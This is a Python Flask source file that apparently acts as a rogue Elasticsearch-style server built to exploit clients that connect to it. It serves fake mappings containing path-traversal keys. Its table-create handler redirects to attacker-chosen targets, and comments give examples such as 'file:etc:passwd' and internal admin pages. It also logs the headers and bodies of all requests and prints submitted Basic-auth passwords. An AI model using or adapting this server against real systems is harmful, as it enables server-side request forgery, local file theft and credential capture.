from flask import Flask, request, redirect
import json
from functools import wraps
import sys
app = Flask(__name__)

@app.before_request
def log_request_info():
    app.logger.debug('Headers: %s', request.headers)
    app.logger.debug('Body: %s', request.get_data())

def login_required(f):
    @wraps(f)
    def wrapped_view(**kwargs):
        auth = request.authorization
        print(auth.password,file=sys.stderr)
        if not auth or  auth.password == None or len(auth.password) == 0:
            print("Failing login no pass",file=sys.stderr)
            return ('Unauthorized', 401, {
                'WWW-Authenticate': 'Basic realm="Login Required"'
            })
        return f(**kwargs)
    print('passed login',file=sys.stderr)
    return wrapped_view


  

#Wonky chatgpt code FTW
#use format file:path:path:path
#or use format any:host:port:path:path
def convert_to_uri(input_string):
    # Split the input string using colons as separators
    parts = input_string.split(':')


    # Check if the string contains at least two parts
    if len(parts) < 2:
        return None  # Invalid input

    scheme = parts[0]
    rest = parts[1:]
    if scheme == "file":
        uri = f"file:///" + '/'.join(rest) 
    else:
        if len(parts) < 3:
            return None
        host = rest[0]
        port = rest[1]
        rest_of_path = rest[2:]
        uri = f"{scheme}://{host}:{port}/" + '/'.join(rest_of_path)
        # Extract the scheme and the rest of the components    
    return uri

@app.route("/<dbname>/_mapping/<table_name2>", methods=["GET"])
def handle_table_mapping(dbname,table_name2):    
    try:
        uri = convert_to_uri(table_name2)
        app.logger.debug(f"GETTING MAPPING table name {table_name2}, uri {uri}")
        return json.dumps({"foo":"bar"})
        #return redirect(uri, 302)    
    except:
        return "ERROR", 500

@app.route("/<dbname>/_mapping", methods=["GET"])
def handle_mapping_read(dbname):
    app.logger.debug(f"Handling a get mapping request")
    data = {dbname:{
        "mappings": {"../../../": "../../../", "../":"a", 'table3':"foo"}
    }}
    return data
@app.route("/<dbname>/<table_name>/_search", methods=["GET"])
def handle_table_get_mapping(dbname,table_name):    
    data = {table_name:{
         "properties": {
      "id": { "type": "text" },
      "title": { "type": "text" },
      "malicious_path": { "type": "text" },  
    }
       }}    
    app.logger.debug(f"I sent some fake table mappings")
    return json.dumps(data)


@app.route("/<dbname>/<table_name>/_mapping", methods=["GET"])
def handle_table_get_search(dbname,table_name):    
    data = {
         "hits": {
      "hits":  
          [{"_id":"foo",
            "_source":{"blag":"blog"}}],
            
       }} 
    app.logger.debug(f"I sent some fake table mappings")
    return json.dumps(data)



#The user is creating a table, we'll use this to redirect to target__OPTIONALPORT__:path:plus:any:extra:directories
#example: file:etc:passwd
#example: http:targetsite__5000:index.php
#example: http:targetsite__5000:admin:index.php
@app.route("/<dbname>/_mapping/<table_name>", methods=["PUT"])
@login_required    
def handle_table_create(dbname,table_name):    
    try:
        uri = convert_to_uri(table_name)
        app.logger.debug(f"Creating table name {table_name}, uri {uri}")
        return redirect(uri, 302)    
    except:
        return "ERROR", 500

@app.route("/", methods=["GET","POST","PUT"])
@login_required
def hello_world():    
    data = {"properties":[{"field": "foo"}]}    
    return json.dumps(data)

